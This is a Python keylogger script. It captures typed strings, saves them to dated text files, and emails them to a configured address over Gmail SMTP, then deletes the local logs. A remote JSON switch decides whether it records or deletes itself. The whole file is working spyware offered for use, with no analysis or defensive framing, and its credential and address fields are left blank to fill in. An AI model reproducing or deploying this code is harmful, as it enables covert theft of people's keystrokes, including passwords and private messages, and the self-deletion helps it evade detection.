#!python3.
import logging
import requests
import keyboard
import os

try:
    import arrow
    date = arrow.now().format('YYYY-MM-DD--HH-MM')
except ModuleNotFoundError:
    import datetime
    date = str(datetime.datetime.now())[:18]
try:
    import httplib
except:
    import http.client as httplib


addr= ##To address
fromaddr=""#The email address to send logs from
frompass=""##password of fromaddr
sub=""#Subject of the email

def generate_events():
    while not (keyboard.is_pressed('windows') or keyboard.is_pressed('ctrl')):
        yield keyboard.read_event()


def should(name):
    """
    (str) -> bool
    Returns True if the keylogger should work, i.e. if the JSON file contains True for the name
    """
    
    link='' #Link to a JSON file
    page=requests.get(link)
    js=page.json()
    if js[name]['valid']=='True':
        print("Should record")
        return True
    if js[name]['del']=='True':
        os.remove(f'{os.getcwd()}\\keylogger.py') ##deletes keylogger.py
    print("NO")
    exit(1)

        


def record():
    """
    Records the key presses
    """
    global date
    global file
    global data
    file = open('{}.txt' .format(date), 'w+')
    try:
        strings = keyboard.get_typed_strings(generate_events())
        data=[]
        while True:
            data.append(next(strings))
            print(data)
        
    except Exception as e:
        print(e)

    
    file.write(str(data))
    file.close()
    print("recorded")
    send_email()


def on_exit():
    global file
    global data
    file.write(data)
    file.close()

def send_email():
    """
    Sends email to the designated address
    """
    if internet():
        print(os.listdir())
        for file in os.listdir():
            if file.endswith('.txt'):
                logging.debug("sending email")
                import smtplib
                from email.mime.multipart import MIMEMultipart
                from email.mime.text import MIMEText
                from email.mime.base import MIMEBase
                from email import encoders

                fromaddr = fromaddr
                toaddr = addr ##To address
                  
                # instance of MIMEMultipart
                msg = MIMEMultipart()
                 
                # storing the senders email address  
                msg['From'] = fromaddr
                 
                # storing the receivers email address 
                msg['To'] = toaddr
                 
                # storing the subject 
                msg['Subject'] = sub
                 
                # string to store the body of the mail
                global date
                body = "Your log for {} " .format(date)
                 
                # attach the body with the msg instance
                msg.attach(MIMEText(body, 'plain'))
                 
                # open the file to be sent 
                filename = file
                attachment = open(filename, "rb")
                 
                # instance of MIMEBase and named as p
                p = MIMEBase('application', 'octet-stream')
                 
                # To change the payload into encoded form
                p.set_payload((attachment).read())
                 
                # encode into base64
                encoders.encode_base64(p)
                  
                p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
                 
                # attach the instance 'p' to instance 'msg'
                msg.attach(p)
                 
                # creates SMTP session
                s = smtplib.SMTP('smtp.gmail.com', 587)
                 
                # start TLS for security
                s.starttls()
                 
                # Authentication
                s.login(fromaddr, frompass) ##Pass
                 
                # Converts the Multipart msg into a string
                text = msg.as_string()
                 
                # sending the mail
                s.sendmail(fromaddr, toaddr, text)
                 
                # terminating the session
                s.quit()
                print("sent")
                attachment.close()
                os.remove(file)
                logging.debug("File deleted")

            else:
                logging.debug("No file found")


def internet():
    """
    Checks if there is an internet Connection
    """
    conn = httplib.HTTPConnection("www.google.com", timeout=5)
    try:
        conn.request("HEAD", "/")
        conn.close()
        logging.debug("Valid Internet Connection")
        return True
    except:
        conn.close()
        logging.debug("No internet")
        return False


if __name__=='__main__':

    if 'UBlogger' in os.listdir():
        os.chdir('UBlogger')

    else:
        os.makedirs('UBlogger')
        os.chdir('UBlogger')
    try:
        while True:
            send_email()
            if should(addr):
                print("recording")
                record()
    except Exception as e:
        print(e)
